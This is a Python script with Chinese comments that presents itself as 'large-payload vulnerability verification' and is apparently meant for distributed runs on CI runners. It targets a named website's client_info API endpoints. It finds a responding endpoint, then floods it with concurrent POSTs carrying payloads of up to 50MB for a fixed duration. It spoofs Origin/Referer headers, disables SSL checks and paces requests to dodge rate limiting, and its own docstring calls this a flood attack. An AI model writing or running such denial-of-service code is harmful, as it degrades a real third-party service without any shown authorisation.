#!/usr/bin/env python3
"""
client_info 大载荷漏洞验证 - 20 并发 Runner
每次发送超大 client_info 载荷测试服务器资源消耗
"""
import asyncio
import aiohttp
import time
import os
import json
import sys
import uuid

TARGET = "https://www.xnmoe.com"
# 尝试多个可能的端点
ENDPOINTS = [
    "/api/client_info",
    "/api/client-info", 
    "/api/clientinfo",
    "/api/NNNroom404/client_info",
    "/api/NNNroom404/client-info",
]

# 载荷大小级别 (bytes)
PAYLOAD_SIZES = {
    "XS": 10_000,      # 10KB - 基准
    "S":  100_000,     # 100KB
    "M":  1_000_000,   # 1MB
    "L":  10_000_000,  # 10MB
    "XL": 50_000_000,  # 50MB
}

NODE_ID = os.environ.get("NODE_ID", "0")
DURATION = int(os.environ.get("DURATION", "120"))
THREADS = int(os.environ.get("THREADS", "5"))

results = {
    "node_id": NODE_ID,
    "start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
    "results": []
}


def generate_payload(size: int) -> dict:
    """生成指定大小的 client_info payload"""
    # 模拟真实的 client_info 结构
    base = {
        "client_id": str(uuid.uuid4()),
        "timestamp": int(time.time()),
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " + "A" * min(size // 10, 500),
        "screen_resolution": "1920x1080",
        "language": "zh-CN",
        "timezone": "Asia/Shanghai",
        "platform": "Win32",
        "cookies_enabled": True,
        "plugins": ["Plugin-" + str(i) for i in range(min(size // 1000, 50))],
        "extra_data": "B" * max(0, size - 500),  # 主要载荷
    }
    return base


async def test_endpoint(session: aiohttp.ClientSession, endpoint: str, size_name: str, payload_size: int) -> dict:
    """测试单个端点"""
    payload = generate_payload(payload_size)
    headers = {
        "Content-Type": "application/json",
        "User-Agent": f"GH-Runner-{NODE_ID}/{uuid.uuid4().hex[:8]}",
        "Origin": "https://www.xnmoe.com",
        "Referer": "https://www.xnmoe.com/",
    }
    
    start = time.time()
    try:
        async with session.post(
            f"{TARGET}{endpoint}",
            json=payload,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=30),
            ssl=False,
        ) as resp:
            elapsed = time.time() - start
            body = await resp.text()
            return {
                "endpoint": endpoint,
                "size": size_name,
                "payload_bytes": payload_size,
                "status": resp.status,
                "elapsed": round(elapsed, 3),
                "body_len": len(body),
                "body_preview": body[:200],
                "error": None,
            }
    except asyncio.TimeoutError:
        elapsed = time.time() - start
        return {
            "endpoint": endpoint,
            "size": size_name,
            "payload_bytes": payload_size,
            "status": 0,
            "elapsed": round(elapsed, 3),
            "body_len": 0,
            "body_preview": "",
            "error": "TIMEOUT",
        }
    except Exception as e:
        elapsed = time.time() - start
        return {
            "endpoint": endpoint,
            "size": size_name,
            "payload_bytes": payload_size,
            "status": -1,
            "elapsed": round(elapsed, 3),
            "body_len": 0,
            "body_preview": "",
            "error": str(e)[:200],
        }


async def flood_endpoint(session: aiohttp.ClientSession, endpoint: str, size_name: str, payload_size: int, count: int):
    """并发洪水攻击 - 持续发送请求"""
    tasks = []
    for i in range(count):
        tasks.append(test_endpoint(session, endpoint, size_name, payload_size))
    batch_results = await asyncio.gather(*tasks)
    return batch_results


async def main():
    print(f"[Runner {NODE_ID}] ===== client_info 大载荷漏洞验证 =====")
    print(f"[Runner {NODE_ID}] 目标: {TARGET}")
    print(f"[Runner {NODE_ID}] 持续时间: {DURATION}s")
    print(f"[Runner {NODE_ID}] 并发线程: {THREADS}")
    print(f"[Runner {NODE_ID}] ================================")
    
    # Phase 1: 端点发现 - 找出有效的 client_info 端点
    print(f"\n[Runner {NODE_ID}] Phase 1: 端点发现...")
    valid_endpoint = None
    
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        for ep in ENDPOINTS:
            result = await test_endpoint(session, ep, "XS", 100)
            status = result["status"]
            body = result.get("body_preview", "")
            print(f"  {ep} -> HTTP {status} | {result['elapsed']}s | {body[:100]}")
            
            # 除了 404 和 Cloudflare 拦截外都算有效
            if status not in (404, 403, 503):
                valid_endpoint = ep
                print(f"  ✅ 有效端点: {ep}")
                break
            elif status == 403 and "cloudflare" in body.lower():
                print(f"  ⚠️ Cloudflare 拦截: {ep}")
            elif status == 404:
                print(f"  ❌ 不存在: {ep}")
        
        if not valid_endpoint:
            # 如果都没有找到，仍尝试第一个端点进行测试
            valid_endpoint = ENDPOINTS[0]
            print(f"\n[Runner {NODE_ID}] ⚠️ 未找到有效端点，使用默认: {valid_endpoint}")
        
        # Phase 2: 渐进式载荷测试
        print(f"\n[Runner {NODE_ID}] Phase 2: 渐进式大载荷测试 (端点: {valid_endpoint})")
        deadline = time.time() + DURATION
        
        round_num = 0
        total_requests = 0
        total_bytes_sent = 0
        errors = 0
        timeouts = 0
        
        while time.time() < deadline:
            round_num += 1
            remaining = max(0, deadline - time.time())
            
            for size_name, size_bytes in PAYLOAD_SIZES.items():
                if time.time() >= deadline:
                    break
                
                # 大载荷少请求，小载荷多请求
                if size_bytes >= 1_000_000:
                    concurrent = max(1, THREADS // 3)
                elif size_bytes >= 100_000:
                    concurrent = max(1, THREADS // 2)
                else:
                    concurrent = THREADS
                
                print(f"\n[Round {round_num}] {size_name} ({size_bytes//1000}KB) x{concurrent}并发...")
                batch = await flood_endpoint(session, valid_endpoint, size_name, size_bytes, concurrent)
                
                for r in batch:
                    total_requests += 1
                    total_bytes_sent += size_bytes
                    if r["error"] == "TIMEOUT":
                        timeouts += 1
                    elif r["error"]:
                        errors += 1
                    
                    results["results"].append(r)
                
                print(f"  完成 {len(batch)} 请求 | "
                      f"总请求: {total_requests} | "
                      f"总流量: {total_bytes_sent//1024}KB | "
                      f"超时: {timeouts} | "
                      f"错误: {errors}")
                
                await asyncio.sleep(0.5)  # 短暂间隔避免被限速
        
        # Phase 3: 最终统计
        print(f"\n{'='*50}")
        print(f"[Runner {NODE_ID}] ===== 执行完毕 =====")
        print(f"  总请求数: {total_requests}")
        print(f"  总发送流量: {total_bytes_sent // (1024*1024)}MB")
        print(f"  超时次数: {timeouts}")
        print(f"  错误次数: {errors}")
        print(f"  成功次数: {total_requests - timeouts - errors}")
    
    # 输出 JSON 结果
    results["total_requests"] = total_requests
    results["total_bytes"] = total_bytes_sent
    results["timeouts"] = timeouts
    results["errors"] = errors
    results["valid_endpoint"] = valid_endpoint
    results["end_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"\n[JSON_RESULT] {json.dumps(results, ensure_ascii=False)}")
    return results


if __name__ == "__main__":
    asyncio.run(main())
